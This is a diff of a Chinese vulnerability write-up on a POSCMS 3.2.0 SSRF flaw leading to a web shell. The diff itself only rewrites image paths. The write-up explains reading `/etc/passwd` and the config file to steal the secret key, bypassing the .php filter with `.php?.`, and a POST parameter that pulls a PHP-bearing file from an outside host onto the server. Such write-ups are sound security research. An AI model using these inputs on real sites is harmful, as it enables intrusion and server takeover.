@@ -106,43 +106,43 @@ POSCMS 3.2.0
 
 Part1没什么好说的，只要管理员不修改默认权限，注册个普通用户就有视频、图片的上传功能。Part2中`dr_authcode()`是一个加解密函数，位于`\diy\dayrui\helpers\function_helper.php`。其具体实现可以不用关心，毕竟源码已经到手，只要找到密钥，就能随意构造加密结果。
 
-![1.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId25.png)
+![1.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId25.png)
 
 Part3中确定了下载文件的名称，这里我们请求的参数中不包含`code`参数，使`$PATH为空`，则它会取问号表达式的后半段`SYS_UPLOAD_PATH.'/'.date('Ym', SYS_TIME).'/'`，最后的上传路径如下：`/uploadfile/年月/`。
 
-![2.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId26.png)
+![2.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId26.png)
 
 Part4中的`dr_catcher_data()`函数正是SSRF漏洞的来源，其实现位于`\diy\dayrui\helpers\function_helper.php`。无论代码最后选的是fopen模式还是curl模式，开发人员都没有对可解析的协议做限制，也没有校验请求参数`$url`的范围。
 
-![3.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId27.png)
+![3.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId27.png)
 
 ### 寻找触发点
 
 直接用VSCode的全局搜索功能，寻找`down_file()`函数的调用位置：
 
-![4.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId29.png)
+![4.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId29.png)
 
 发现它出现在了一个js文件中，于是构造一个XHR的POST请求到服务端，设置`file`参数的值使其访问`/etc/passwd`，得到如下响应：
 
-![5.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId30.png)
+![5.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId30.png)
 
 用浏览器打开"文件存储路径+返回的文件名"：
 
-![6.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId31.png)
+![6.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId31.png)
 
 ### GetShell
 
 再请求一下`/config/system.php`，该文件中存储有重要的元数据。
 
-![7.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId33.png)
+![7.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId33.png)
 
 这是因为Part5中的`$ext`变量虽然为空，但它专门过滤了.php文件，好在利用`file://`协议的解析特性，可以绕过这一点，比如`.php?.`或`.php#.`：
 
-![8.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId34.png)
+![8.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId34.png)
 
 再次用浏览器打开并设置编码格式为UTF-8：
 
-![9.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId35.png)
+![9.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId35.png)
 
 获取到安全密钥后，可以构造特殊payload绕过扩展名检查。这里，总结一下此次GetShell的思路：
 
@@ -152,13 +152,13 @@ Part4中的`dr_catcher_data()`函数正是SSRF漏洞的来源，其实现位于`
 
 为了绕过扩展名检查，我将加密代码拷贝进另一文件并填入密钥，输入选择`1|html,|0`，运行得到输出为`22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM`，并构造POST参数`file=http://www.0-sec.org/haha.html&url=code=22d7Qrdws88/R/uETpWlvY/PFNTYzvs/QNj5PBa66veNDlECqpM`，这里的`haha.html`里包含了php代码`<?php echo phpinfo();?>`，最终效果如下：
 
-![10.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId36.png)
+![10.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId36.png)
 
-![11.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId37.png)
+![11.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId37.png)
 
 如果这里复现失败了，那大概是在于两点：一、加密函数有时效性，过时需要重新生成；二、CentOS默认安装的Apache无法解析包含php代码的html文件，需要在`/etc/httpd/conf.d/php.conf`中添加如下：
 
-![12.png](/Users/aresx/Documents/VulWiki/.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId38.png)
+![12.png](./.resource/POSCMS3.2.0ssrf漏洞getshell/media/rId38.png)
 
 参考链接
 --------
